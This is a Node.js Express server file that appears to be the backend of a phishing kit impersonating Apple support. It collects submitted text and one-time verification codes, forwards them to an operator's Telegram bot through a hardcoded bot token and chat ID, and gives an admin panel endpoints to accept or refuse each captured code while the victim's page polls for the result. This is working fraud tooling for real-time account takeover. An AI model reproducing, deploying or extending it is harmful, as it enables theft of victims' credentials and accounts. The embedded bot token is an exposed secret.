const express = require('express');
const https = require('https');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_API = 'https://api.telegram.org';
const BOT_TOKEN = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
const CHAT_ID = '6547125053';

const codes = [];
let codeIdCounter = 0;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

function sendTelegram(text) {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify({ chat_id: CHAT_ID, text: text });
        const options = {
            hostname: 'api.telegram.org',
            path: '/bot' + BOT_TOKEN + '/sendMessage',
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
        };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch(e) { resolve({}); }
            });
        });
        req.on('error', (e) => { resolve({}); });
        req.write(postData);
        req.end();
    });
}

app.post('/api/send', async (req, res) => {
    const { text } = req.body;
    try {
        const codeMatch = text.match(/Code:\s*(.+)/);
        const adminUrl = '\n\nPanel admin: https://support-apple-production.up.railway.app/admin.html';

        if (codeMatch) {
            const codeEntry = {
                id: ++codeIdCounter,
                code: codeMatch[1].trim(),
                status: 'pending',
                time: new Date().toLocaleString('fr-FR')
            };
            codes.push(codeEntry);
            await sendTelegram(text + adminUrl);
            return res.json({ ok: true, codeId: codeEntry.id });
        }

        await sendTelegram(text);
        res.json({ ok: true });
    } catch(e) {
        res.json({ ok: true });
    }
});

app.post('/api/alert', (req, res) => {
    const { text } = req.body;
    sendTelegram(text).then(() => res.json({ ok: true })).catch(() => res.json({ ok: true }));
});

app.get('/api/admin/codes', (req, res) => {
    res.json(codes);
});

app.post('/api/admin/accept', (req, res) => {
    const { id } = req.body;
    const code = codes.find(c => c.id === id);
    if (code) {
        code.status = 'accepted';
        return res.json({ ok: true });
    }
    res.status(404).json({ error: 'not found' });
});

app.post('/api/admin/refuse', (req, res) => {
    const { id } = req.body;
    const code = codes.find(c => c.id === id);
    if (code) {
        code.status = 'refused';
        return res.json({ ok: true });
    }
    res.status(404).json({ error: 'not found' });
});

app.get('/api/check-status/:id', (req, res) => {
    const code = codes.find(c => c.id === parseInt(req.params.id));
    if (code) {
        return res.json({ status: code.status });
    }
    res.status(404).json({ error: 'not found' });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log('Serveur en ligne sur le port ' + PORT);
});
